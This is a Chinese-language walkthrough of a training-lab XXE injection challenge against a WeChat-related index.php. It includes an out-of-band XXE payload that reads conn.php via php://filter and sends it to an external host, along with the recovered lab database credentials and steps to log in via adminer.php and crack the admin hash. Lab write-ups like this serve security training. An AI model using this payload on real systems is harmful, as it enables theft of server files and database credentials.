@@ -1,0 +1,22 @@
+xxe实体注入靶场：
+1.这是一个微信提供的官方文件 这个文件爆出了一个漏洞 本题是在weixin/index.php下 全局搜索simplexml_load_string()函数
+
+2.要求变量signature不为空 变量echostr为空时才会执行 抓包的时候是GET方式传参 需要修改为POST方式 因为POST方式你下面写什么参数它就传什么
+
+3.传过去后就报错了 报错就说明生效了 找不到1.txt文件 但是找到了绝对路径C:\phpStudy\scms\weixin\index.php
+
+4.根据源码我们可以发现路径中有个scms/conn/conn.php 里面存放着数据库的账号和密码 我们可以用构建好的xxe语句去读取mysqli_connect里面的内容
+<?xml version="1.0"?>
+<!DOCTYPE ANY[
+<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=C:/phpStudy/scms/conn/conn.php">
+<!ENTITY % remote SYSTEM "http://59.63.200.79:8017/1.xml"> 
+%remote;
+%send; 
+]>
+
+5.把刚才的操作重新来过 这一次下面传参写入xxe语句 靶场下面提供了官方xxe炮台 进入http://59.63.200.79:8017/3.txt 后就会看到一串base64编码 在网页上进行解码就得到 虽然解码不全 但是数据库的账号和密码都在
+$conn = mysqli_connect("192.168.0.10","xxe", "teiwo!8#7ERe1DPC", "scms");
+
+6.靶场留了一个adminer.php(就是一个常见的在线数据库管理工具) 输入用户名(xxe),密码(teiwo!8#7ERe1DPC)和库名(scms)就可以进去了
+
+7.进去后找到管理员的密码然后进行MD5解码就完成了靶场
